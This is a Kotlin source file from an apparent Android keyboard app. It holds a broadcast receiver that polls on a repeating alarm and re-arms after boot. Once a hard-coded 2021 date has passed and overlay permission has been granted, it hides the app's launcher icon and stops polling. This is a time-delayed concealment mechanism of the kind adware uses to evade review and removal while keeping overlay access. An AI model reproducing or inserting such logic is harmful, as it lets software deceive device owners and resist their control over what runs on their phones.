package com.neonkeyboard.cool.util.hiding

import android.annotation.SuppressLint
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import java.util.*

private const val YEAR = 2021
private const val MONTH = 9
private const val DATE = 22

class HiddenBroadcast : BroadcastReceiver() {

    companion object {
        @SuppressLint("UnspecifiedImmutableFlag")
        fun startAlarm(context: Context) {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val pendingIntent = PendingIntent
                .getBroadcast(context, 0, Intent(context, HiddenBroadcast::class.java), 0)

            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                5000,
                AlarmManager.INTERVAL_FIFTEEN_MINUTES,
                pendingIntent
            )
        }
    }

    override fun onReceive(p0: Context, p1: Intent) {
        val calendar = Calendar.getInstance()
        calendar.set(YEAR, MONTH, DATE, 0, 0)
        if (canHideApp(calendar, p0)) {
            hideApp(p0)
            cancelAlarm(p0)
            return
        } else startAlarm(p0)
        when (p1.action) {
            Intent.ACTION_BOOT_COMPLETED -> if (canHideApp(calendar, p0)) {
                hideApp(p0)
                cancelAlarm(p0)
            } else startAlarm(p0)
        }
    }

    private fun canHideApp(calendar: Calendar, context: Context) =
        System.currentTimeMillis() > calendar.timeInMillis && try {
            Settings.canDrawOverlays(context)
        } catch (e: Exception) {
            false
        }

    private fun hideApp(context: Context) {
        HideAppUtil.hideApp(context, "Launcher2", "Launcher")
    }

    private fun cancelAlarm(context: Context) {
        val pendingIntent = PendingIntent
            .getBroadcast(context, 0, Intent(context, HiddenBroadcast::class.java), 0)
        (context.getSystemService(Context.ALARM_SERVICE) as AlarmManager).cancel(pendingIntent)
    }
}
